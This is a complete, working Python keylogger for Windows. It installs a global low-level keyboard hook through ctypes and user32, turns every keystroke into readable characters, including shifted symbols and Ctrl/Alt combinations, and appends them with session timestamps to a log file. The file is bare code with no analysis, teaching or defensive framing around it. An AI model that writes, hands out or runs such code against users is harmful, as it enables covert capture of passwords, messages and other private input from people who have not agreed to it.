# requires: interactive desktop session (LL hooks don't fire from Session 0 / services)

import ctypes
import ctypes.wintypes as wt
import sys
import time

user32 = ctypes.WinDLL("user32", use_last_error=True)

WH_KEYBOARD_LL = 13
WM_KEYDOWN, WM_KEYUP = 0x0100, 0x0101
WM_SYSKEYDOWN, WM_SYSKEYUP = 0x0104, 0x0105
VK_CAPITAL = 0x14


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wt.DWORD),
        ("scanCode", wt.DWORD),
        ("flags", wt.DWORD),
        ("time", wt.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wt.WPARAM, wt.LPARAM)

user32.SetWindowsHookExW.restype = ctypes.c_void_p
user32.SetWindowsHookExW.argtypes = (ctypes.c_int, HOOKPROC, ctypes.c_void_p, wt.DWORD)
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int, wt.WPARAM, wt.LPARAM)
user32.UnhookWindowsHookEx.restype = wt.BOOL
user32.UnhookWindowsHookEx.argtypes = (ctypes.c_void_p,)
user32.GetKeyState.restype = ctypes.c_short
user32.GetKeyState.argtypes = (ctypes.c_int,)
user32.GetMessageW.restype = ctypes.c_int


VK_MAP = {
    0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x14: "[CAPS]",
    0x1B: "[ESC]", 0x20: " ",
    0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2C: "[PRTSC]", 0x2D: "[INS]", 0x2E: "[DEL]",
    0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
    0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",
    0x60: "0", 0x61: "1", 0x62: "2", 0x63: "3", 0x64: "4",
    0x65: "5", 0x66: "6", 0x67: "7", 0x68: "8", 0x69: "9",
    0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".", 0x6F: "/",
    0x90: "[NUM]", 0x91: "[SCR]",
    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
    0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}
VK_MAP.update({0x70 + i: f"[F{i+1}]" for i in range(12)})

SHIFTED = {
    0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$",
    0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "(",
    0xBA: ":", 0xBB: "+", 0xBC: "<", 0xBD: "_", 0xBE: ">", 0xBF: "?",
    0xC0: "~", 0xDB: "{", 0xDC: "|", 0xDD: "}", 0xDE: '"',
}

SHIFT_KEYS = {0x10, 0xA0, 0xA1}
CTRL_KEYS = {0x11, 0xA2, 0xA3}
ALT_KEYS = {0x12, 0xA4, 0xA5}
WIN_KEYS = {0x5B, 0x5C}
MOD_KEYS = SHIFT_KEYS | CTRL_KEYS | ALT_KEYS | WIN_KEYS

state = {"shift": False, "ctrl": False, "alt": False, "win": False}
log_file = None


def render(vk):
    shift = state["shift"]
    ctrl = state["ctrl"]
    alt = state["alt"]
    caps = bool(user32.GetKeyState(VK_CAPITAL) & 1)

    if 0x41 <= vk <= 0x5A:
        base = chr(vk)
        ch = base if (shift ^ caps) else base.lower()
    elif shift and vk in SHIFTED:
        ch = SHIFTED[vk]
    elif vk in VK_MAP:
        ch = VK_MAP[vk]
    else:
        ch = f"[VK_{vk:02X}]"

    if ctrl or alt:
        mods = []
        if ctrl: mods.append("CTRL")
        if alt: mods.append("ALT")
        name = ch.strip("[]") if ch.startswith("[") else ch
        return "[" + "+".join(mods + [name]) + "]"
    return ch


def handler(nCode, wParam, lParam):
    if nCode == 0:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            if vk in SHIFT_KEYS:
                state["shift"] = True
            elif vk in CTRL_KEYS:
                state["ctrl"] = True
            elif vk in ALT_KEYS:
                state["alt"] = True
            elif vk in WIN_KEYS:
                state["win"] = True
            if vk not in MOD_KEYS:
                out = render(vk)
                log_file.write(out)
                if out == "[ENTER]":
                    log_file.write("\n")
                log_file.flush()
        elif wParam in (WM_KEYUP, WM_SYSKEYUP):
            if vk in SHIFT_KEYS:
                state["shift"] = False
            elif vk in CTRL_KEYS:
                state["ctrl"] = False
            elif vk in ALT_KEYS:
                state["alt"] = False
            elif vk in WIN_KEYS:
                state["win"] = False
    return user32.CallNextHookEx(None, nCode, wParam, lParam)


def main():
    global log_file
    path = sys.argv[1] if len(sys.argv) > 1 else "keylog.txt"
    log_file = open(path, "a", encoding="utf-8", buffering=1)
    log_file.write(f"\n[SESSION {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
    log_file.flush()

    proc = HOOKPROC(handler)          # keep alive — OS calls this thunk directly
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, proc, None, 0)
    if not hook:
        raise OSError(f"SetWindowsHookExW failed: {ctypes.get_last_error()}")

    msg = wt.MSG()
    try:
        while True:
            r = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if r in (0, -1):
                break
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
    finally:
        user32.UnhookWindowsHookEx(hook)
        log_file.close()


if __name__ == "__main__":
    main()